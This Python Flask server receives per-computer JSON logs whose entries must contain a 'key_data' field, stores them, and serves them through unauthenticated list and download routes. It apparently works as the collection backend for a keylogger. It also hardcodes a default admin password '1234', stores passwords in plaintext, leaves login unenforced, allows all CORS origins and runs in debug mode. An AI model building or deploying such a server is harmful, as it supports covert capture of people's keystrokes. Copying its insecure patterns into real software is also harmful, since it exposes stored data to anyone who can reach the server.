from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import os

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# 📌 Storage directory and file paths
SAVE_DIR = "received_files"
FILE_PATH = os.path.join(SAVE_DIR, "received_data.json")  # Logs file
USER_FILE = os.path.join(SAVE_DIR, "users.json")  # Users file
os.makedirs(SAVE_DIR, exist_ok=True)  # Create directory if it doesn't exist

# ==============================
# 🔹 Utility Functions
# ==============================

def load_json_file(filepath, default_data):
    """Loads a JSON file if it exists, otherwise returns default data."""
    if os.path.exists(filepath):
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else default_data
        except (json.JSONDecodeError, IOError) as e:
            print(f"❌ Error loading {filepath}: {e}")
            return default_data
    return default_data

def save_json_file(filepath, data):
    """Saves data to a JSON file."""
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
    except IOError as e:
        print(f"❌ Error writing {filepath}: {e}")

# Load existing data from files
logs_data = load_json_file(FILE_PATH, {})
users = load_json_file(USER_FILE, {}).get("users", {})

# If users.json does not exist, create a default admin user
if not users:
    users = {"admin": "1234"}
    save_json_file(USER_FILE, {"users": users})

# ==============================
# 🔹 Flask Routes
# ==============================

@app.route('/upload', methods=['POST'])
def upload_json():
    """Receives and stores logs from a computer."""
    try:
        data = request.get_json()
        if not isinstance(data, dict):
            return jsonify({"error": "Invalid JSON format"}), 400

        computer_id = data.get("computer_id")
        logs = data.get("logs")

        if not isinstance(computer_id, str) or not isinstance(logs, dict):
            return jsonify({"error": "Invalid JSON structure"}), 400

        # Validate received logs
        for timestamp, log_data in logs.items():
            if not isinstance(log_data, dict) or 'key_data' not in log_data:
                return jsonify({"error": f"Invalid log format for {timestamp}"}), 400

        # Add logs to local database
        logs_data.setdefault(computer_id, {})
        logs_data[computer_id].update(logs)
        save_json_file(FILE_PATH, logs_data)

        print(f"✅ Logs stored successfully for {computer_id}")
        return jsonify({"message": "Logs stored successfully"}), 200

    except Exception as e:
        print(f"❌ Server error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route('/computers', methods=['GET'])
def get_computers():
    """Returns a list of registered computers."""
    try:
        return jsonify({"computers": list(logs_data.keys())}), 200
    except Exception as e:
        print(f"❌ Server error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route('/download/<computer_id>', methods=['GET'])
def download_json(computer_id):
    """Downloads logs for a specific computer."""
    try:
        if computer_id in logs_data:
            print(f"📥 Downloading logs for {computer_id}")
            return jsonify(logs_data[computer_id]), 200
        else:
            return jsonify({"error": "No logs found for this computer"}), 404
    except Exception as e:
        print(f"❌ Server error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route('/login', methods=['POST'])
def login():
    """Verifies user credentials."""
    try:
        data = request.get_json()
        username = data.get("username")
        password = data.get("password")

        if users.get(username) == password:
            print(f"✅ Successful login for user: {username}")
            return jsonify({"message": "Login successful"}), 200
        else:
            print(f"❌ Failed login attempt for user: {username}")
            return jsonify({"error": "Invalid credentials"}), 401

    except Exception as e:
        print(f"❌ Server error: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==============================
# 🔹 Run Flask Application
# ==============================

if __name__ == '__main__':
    print("🚀 Server is running on http://127.0.0.1:5000")
    app.run(debug=True)
